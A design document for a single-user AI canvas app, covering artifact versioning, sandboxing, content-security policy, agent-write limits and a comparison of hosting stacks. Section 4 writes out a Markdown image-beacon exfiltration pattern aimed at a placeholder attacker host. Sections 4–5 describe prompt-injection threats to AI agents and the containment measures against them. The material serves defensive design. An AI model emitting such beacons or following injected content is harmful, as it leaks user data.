# Hermes Canvas — MVP implementation options

Companion to `docs/fable-post-research-review.md`. Sections 1–5 are the **platform-independent core spec** every option must satisfy — the artifact contract, append-only/diff model, live-update model, sandboxing, and agent-write policy, each derived from the evidence and binding regardless of stack. Section 6 defines the readership test. Sections 7–9 evaluate the stacks and state the decision.

No implementation is included or implied by this document. All prices accessed 2026-07-13 (`research/catalog.md`) — **re-verify every figure at commitment time**; several vendors repriced within the last year.

---

## 1. MVP scope (what gets built at all)

- Single owner, closed access (no signup, no user management UI).
- Left pane: chat with the agent; text + image/file attachments (10 MB/file cap, private storage).
- Right pane: tabbed canvas. Artifact types at MVP: **Markdown** and **Mermaid**. Sandboxed static-HTML containers are the first follow-up (the sandbox shell in §4 is specced now so it isn't retrofitted). Kanban = a Markdown table until usage proves promotion.
- Append-only versioning with a semantic diff renderer and per-artifact/per-tab "changed since you last looked" indicators — this is the product core and ships before any additional renderer.
- Server-authoritative live updates with clean reconnect.
- Visible error states for every failed render, oversized write, or blocked capability. No silent no-ops.

Explicitly deferred (unchanged from the pre-review, now evidence-backed): interactive HTML apps, structured boards, multi-user anything, CRDTs, artifact graphs beyond hyperlinks, mobile/offline/export-pipelines/billing.

## 2. Artifact contract

The contract is the design surface (pre-review T4). The agent writes **through this contract only** — never raw storage access.

**Artifact** (stable identity — never a new identity per edit; Gemini's new-artifact-per-update is the documented anti-pattern):

```
artifact {
  id            // stable for the artifact's lifetime
  workspace_id, tab_id
  type          // 'markdown' | 'mermaid'   (+ 'html-static' post-MVP)
  title
  status        // 'active' | 'archived'   — no hard delete exists
  created_at, created_by
  head_seq      // latest version sequence number
}
```

**Version** (append-only; the audit record):

```
version {
  artifact_id, seq          // seq strictly increasing, assigned by the server
  parent_seq                // what the writer based the edit on
  content                   // full snapshot at MVP sizes (≤256 KB text, hard limit)
  author                    // 'human' | 'agent'
  agent_turn_id             // links to the chat turn that produced it (null for human)
  why                       // agent-supplied one-line rationale, required for agent writes
  resolved_action           // server-recorded ground truth: op, target, byte-range/region
  created_at
}
```

**Viewer state:** `last_seen { artifact_id, seq, at }` — drives the "changed since you last looked" badges (the single most-requested legibility feature in the canvas evidence).

**Validation at the write boundary:** size limit enforced with a visible rejection (never truncation — silent truncation is a documented ChatGPT failure); Mermaid parsed at write time, parse failures still stored but flagged so the renderer shows error + raw source; Markdown stored raw, sanitized at render (§4).

**Content limits rationale:** 256 KB/version keeps full-snapshot storage trivial (~thousands of versions per GB), keeps diffs computable client-side, and sits far above the ~8–10k-token zone where incumbents start silently mangling documents. Delta storage is a post-MVP optimization, not a correctness feature.

## 3. Append-only/diff model and write contention

- **Append-only, no truncation, ever.** History that vanishes or restores the wrong version is worse than no history (high-confidence C1 finding). Restore = a *new* version whose content equals an old one; the chain never rewrites.
- **Archive, not delete.** Artifacts and tabs soft-archive; destructive-looking operations require human confirmation and offer export first.
- **Serialization is the contention policy.** All writes flow through one server-side sequencer per workspace. If human and agent both write from the same `parent_seq`, both land as sequential versions — data loss is impossible by construction — and the second is flagged `contended` so the UI surfaces a merge prompt instead of silent last-write-wins. This answers pre-review F1 without CRDTs, which the evidence rates overkill at 1+1 (writes are largely turn-based; reserve CRDT only if true simultaneous same-region co-editing ever materializes).
- **Region-scoped agent edits.** The agent edit op takes an optional target region (heading-anchored section or line range) so it never round-trips the whole document — the mechanism behind incumbent truncation/overwrite failures. Whole-document writes remain allowed but are labeled as such in the diff.
- **The diff renderer is where legibility lives** (nbdime lesson). MVP: word-level diff over *rendered* Markdown (not raw text), insertions/deletions highlighted in place; Mermaid = source diff plus before/after render side-by-side. Every agent version displays its `why` and its `resolved_action`. Raw-text diff is the fallback, never the primary.
- **The log is system-written.** `resolved_action` is recorded by the server from what actually happened, never from the agent's self-description (GhostApproval + Replit-incident lessons: the agent's account of its own actions is not evidence).

## 4. Sandboxing and content-security policy

Uniform rule: **agent-authored content is untrusted input everywhere**, including Markdown and Mermaid, not just HTML.

**App origin (chat + canvas chrome + markdown/mermaid rendering):**
- Markdown rendered with a strict sanitizer: no raw HTML pass-through, no event handlers, `javascript:` URLs stripped.
- Mermaid rendered with `securityLevel: 'strict'` equivalent (no script, no click handlers).
- The app origin ships its own CSP with `img-src 'self' data: <attachments-origin>` — this kills the Markdown image-beacon exfil channel *app-wide* (the exact `![x](https://attacker/?q=data)` pattern that leaked data from ≥7 major AI products). External images in agent Markdown simply do not load; the broken-image state shows the target URL so exfil *attempts* become visible evidence rather than silent leaks.
- No remote fonts/scripts/styles; everything bundled.

**Content origin (attachments now; HTML containers at first follow-up):** a **separate registrable domain** (claudeusercontent.com pattern — a subdomain of the app domain is not sufficient isolation for cookies/site-scoped features).
- Attachments: private, auth-checked URLs, served with `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` (uploaded HTML/SVG served inline is stored XSS — multiple published advisories).
- HTML containers (when built): `<iframe sandbox="allow-scripts">` — **never** with `allow-same-origin` (together they let the frame strip its own sandbox; MDN/web.dev/W3C, high confidence) — content delivered via origin-verified **one-way** postMessage (parent seeds, child cannot read back; verify origin on both ends — a real Claude bug class). Frame CSP: `default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src data:; connect-src 'none'`.
- **Zero external origins in the frame CSP — stricter than Claude's cdnjs allowlist, deliberately** (see post-review §2.2: script-src allowlists are still an exfil path via request URLs; EchoLeak proved allowlists get laundered). Libraries the renderer needs are bundled on the content origin. Relaxation later requires per-library, path-pinned review.
- Only the focused tab mounts a live iframe; background artifacts show a cached static render (live iframes are disproportionately heavy; canvas perf cliffs start ~1k objects).

**Failure visibility:** any blocked capability (storage, network, oversized payload) renders an inline error with the raw source. The documented Claude Artifacts failure — blocked localStorage that silently "succeeds" — is the anti-pattern.

## 5. Agent-write policy

- The agent's only write path is a **validated tool API**: `create_artifact`, `update_artifact(region?, why)`, `archive_artifact`, `set_tab`. Schema-validated (tldraw agent-kit pattern), server-enforced — the model never touches storage or emits raw DB ops.
- `why` is required on every agent write; writes without it are rejected. This feeds the review-cost thesis directly.
- **Rate and size limits**: writes/minute per artifact capped (thrash protection + injection blast-radius control, pre-review S5); 256 KB/version.
- **No agent-initiated hard deletion exists in the system.** Archive is reversible and logged; anything irreversible requires an explicit human confirmation in the app UI, and the confirmation dialog displays the `resolved_action` (real target, real effect), never the agent's phrasing of it.
- All attachments and any content the agent reads are treated as injection carriers (S2); the write policy above — no egress from rendered content, rate limits, ground-truth logging, archive-only — is the containment for a compromised agent, and the visible-broken-image behavior turns exfil attempts into audit events.
- Default-on, not modal: these gates have no "yolo mode." The Windsurf finding is that safety-by-configuration fails because defaults vary by mode; Hermes has one mode.

## 6. The readership test (the unproven bet, instrumented)

Bet 1 (do persistent, diffable artifacts actually get read?) survives research unproven. The MVP itself is the experiment:

- **Instrument:** diff-view opens per agent write; "changed since last looked" badge clicks; reverts/restores; artifact re-opens >24 h after creation; median time from agent write → human first view.
- **Run:** 4 weeks of real daily use after MVP is stable.
- **Keep signal:** diffs opened for a meaningful fraction of substantive agent writes (calibrate first week; the point is trend, not a magic number), at least occasional reverts/restores (proves the history is load-bearing), artifacts consulted across sessions.
- **Kill signal:** badges accumulate unclicked, diffs unopened, artifacts write-only. Response is not to add renderers — it is to accept that the surface is a *display* not an *audit* tool, and stop investing in versioning UX beyond safety-floor rollback.

## 7. Stack options

All three mandated combinations evaluated; auth is assessed per-option because the mandated Clerk component fails the evidence test at MVP (post-review R5). **Corpus gap, restated:** Clerk and D1 have zero research captures; statements about them below are background knowledge and marked ⚠︎unverified.

Common to all options: Markdown/Mermaid render in-app (§4), so the sandbox/content origin is a static concern (a second domain serving static files + headers) and costs ~$0 on every option — it does not differentiate the stacks.

### Option A — Convex (backend/live/state) + Vercel (frontend) + auth substitute

- **Shape:** Next.js on Vercel Hobby; Convex holds `artifacts`/`versions`/`messages`/`last_seen` tables and the write sequencer as mutation functions (Convex mutations are strict-serializable — the §3 serialization policy falls out of the platform for free). Every query is automatically a live subscription: the entire live-update model (§3 push + reconnect) is SDK-handled, near-zero custom sync code. Vercel never carries the live channel (it can't — high confidence), only static/SSR delivery; the browser talks to Convex directly.
- **Agent runtime:** Convex actions call the Anthropic API and dispatch tool calls into mutations. ⚠︎unverified: action duration ceilings and streaming ergonomics for multi-minute agent turns are exactly what the corpus never examined — this is Spike question 1. Fallback if actions don't fit: a $2/mo Fly worker running the agent loop, writing through the same Convex tool API (adds a vendor, preserves the contract).
- **Auth:** Clerk works here (native Convex/Vercel integration, free tier ⚠︎unverified) but adds a user-management product to an app with one user. Evidence-backed substitute: **OAuth-allowlist-of-one** (check `email === OWNER` in the Next.js session + Convex auth adapter), or put the whole Vercel deployment behind **Cloudflare Access** ($0, edge-enforced) if the domain is proxied through Cloudflare.
- **Attachments:** Convex file storage (1 GB free) or R2; either way served through the content origin per §4.
- **Cost:** **$0/mo floor** (Convex free: 1M function calls, 0.5 GB DB, 1 GB files; Vercel Hobby $0 non-commercial). Overage risk is the real number to watch: every reactive query re-run is a billed function call, and a chatty agent multiplies re-runs — pay-as-you-go is enabled even on free. Vercel Hobby prohibits commercial use, so the T7 product pivot immediately costs $20/mo + Convex Pro $25/mo.
- **Risks:** agent-runtime fit unproven (spike); overage surprise; two–three vendors; Convex is the least commodity component (migration cost if it repriced or folded — its schema is portable, its reactivity model is not).
- **Build effort:** lowest. The corpus's own read: "least code for server-authoritative push."

### Option B — Supabase (Postgres/realtime/storage/auth) + Vercel + Clerk

- **Shape:** Next.js on Vercel; Postgres tables for the contract; Supabase Realtime (WAL-based) as the push channel; Supabase Storage for attachments.
- **Why it loses (evidence-backed, post-review R6):**
  1. **Real always-on floor is $25/mo** — free projects auto-pause after ~7 idle days, which for a personal always-available app means Pro or a fragile keep-alive hack (high confidence). 5–12× the alternatives.
  2. **Weaker live-update semantics:** WAL events are not delivered on the same consistent channel as queries, so the client must refetch-and-reconcile — Hermes would hand-build the sync layer Convex gives for free, at higher cost. More code *and* more money.
  3. **Clerk is redundant here twice over:** Supabase ships auth, and the MVP needs an allowlist of one. Running Clerk beside Supabase Auth + RLS is integration surface with no user to serve.
- **What would change the verdict:** a hard requirement for SQL/Postgres portability or existing Supabase expertise, at the product pivot (multi-tenant + RLS + bundled auth is a genuinely reasonable *product* stack). Not the MVP.
- **Cost:** $25/mo realistic. **Rejected.**

### Option C — Cloudflare Workers + Durable Objects (+ R2, DO-SQLite) + Cloudflare Access

- **Shape:** one Durable Object per workspace = the sequencer, the WebSocket hub, and the store (versions in DO-embedded SQLite). WebSocket Hibernation keeps an always-connected app at the billing floor (idle sockets stay open, duration billing pauses). Frontend on Cloudflare Pages/Workers static assets. Attachments in R2 (10 GB free, zero egress — best attachment economics in the corpus) via a Worker on the content origin. The documented "DO owns the message log, streams agent tokens, resumes cleanly on reconnect" pattern is a near-exact match for Hermes' live model.
- **D1:** ⚠︎unverified in the corpus. Not needed for MVP — the per-workspace DO's own SQLite covers the contract, and a single-owner app has one workspace or few. D1 becomes relevant only for cross-workspace querying later; adding it now is an unresearched component with no MVP job.
- **Auth:** **Cloudflare Access email-allowlist-of-one** — the strongest auth-for-one evidence in the corpus: $0, ~15 min, zero auth code, enforced at the edge *before* traffic reaches the app; the Worker validates `Cf-Access-Jwt-Assertion`. The agent authenticates separately with a service token.
- **Agent runtime:** a Worker invoked by the DO calls the Anthropic API. Most agent-turn time is awaiting the API (wall-clock, not CPU), which suits Workers' CPU-time billing, but multi-minute streaming turns and hibernation interplay are ⚠︎unverified — Spike question 1 again, other leg.
- **Cost:** **$0 on free tier** (SQLite-only, daily caps, hibernation mandatory) / **$5/mo Workers Paid** as the comfortable floor. Single vendor for auth+compute+state+storage+CDN.
- **Risks:** most hand-built code — WS protocol, fan-out, reconnect/backoff, optimistic UI, migrations inside a DO; single-vendor concentration (also an operational simplicity win); DO storage billing only started Jan 2026, so pricing has already moved once.
- **Build effort:** highest of the viable pair. The corpus's read: "most control, lowest level."

## 8. Comparison

| | A: Convex+Vercel | B: Supabase+Vercel+Clerk | C: Cloudflare DO |
|---|---|---|---|
| $/mo floor (1 user, always-on) | **$0** (overage-watch) | $25 realistic | **$0–$5** |
| Live-update model | Built-in reactive queries, strict-serializable | WAL events, client reconciliation needed | Hand-built WS on DO, hibernation |
| §3 write serialization | Free (platform mutations) | Hand-built (Postgres tx + channel) | Free (single-threaded DO) |
| Auth-for-one | OAuth-allowlist or Access | Bundled but redundant w/ Clerk | Access allowlist ($0, no code) |
| Attachments | Convex files or R2 | Supabase Storage | R2 (zero egress) |
| Agent runtime | Convex actions ⚠︎spike | External runner needed | Worker+DO ⚠︎spike |
| Build effort | Lowest | Middle, worst code-to-value | Highest |
| Vendor count | 2–3 | 3 | 1 |
| Product-pivot (T7) cost step | Vercel Pro $20 + Convex Pro $25 | Already $25 + Clerk tiers | Stays ~$5 until real scale |
| Corpus confidence | High (pricing/reactivity) except agent runtime | High (incl. the disqualifiers) | High except agent runtime |

## 9. Decision

**Rejected now, on evidence:** Option B (cost floor + weaker realtime + redundant auth), and Clerk in any MVP option (unresearched *and* solves a problem the MVP must not have).

**Between A and C, a firm pick is not yet justified.** Both hit the $0–$5 floor, both satisfy the core spec, and the corpus's own bottom line names them co-leaders. The genuine unknown that separates them was never researched: **where the agent loop runs.** Guessing that in a doc would be exactly the unsupported-assumption behavior this review exists to reject.

**The spike (time-boxed: ≤1 week, ~2–3 days of actual work):**
1. **Agent-loop fit, both legs:** run a real multi-minute streaming Anthropic-API agent turn (a) inside a Convex action writing mutations, (b) inside a Worker streaming through a hibernation-enabled DO. Measure: duration ceilings hit, streaming-to-client latency, behavior on client disconnect mid-turn, and what a turn costs in function calls / duration-GB-s.
2. **Chatty-agent billing probe:** simulate a heavy day (hundreds of writes + live subscriptions) and extrapolate monthly cost on each platform's meter.
3. **Re-verify pricing** for whichever numbers the spike touches (mandatory; figures are five-months-plus old at any commitment date).

**Decision rule, pre-committed:** if Convex actions sustain the agent turn cleanly (no ceiling gymnastics, no external runner needed) and the billing probe stays comfortably inside free-tier bands → **Option A**, with OAuth-allowlist-of-one (or Access in front), because at MVP the dominant cost is engineering time and A minimizes it. If the agent loop needs an external runner anyway (A's simplicity advantage collapses to roughly C's effort plus more vendors) or the function-call meter looks spiky → **Option C**, taking the extra build effort for the single-vendor $5 ceiling and the edge-enforced allowlist. Either way the §2–§5 core spec is identical — the spike risks a few days, not the architecture.
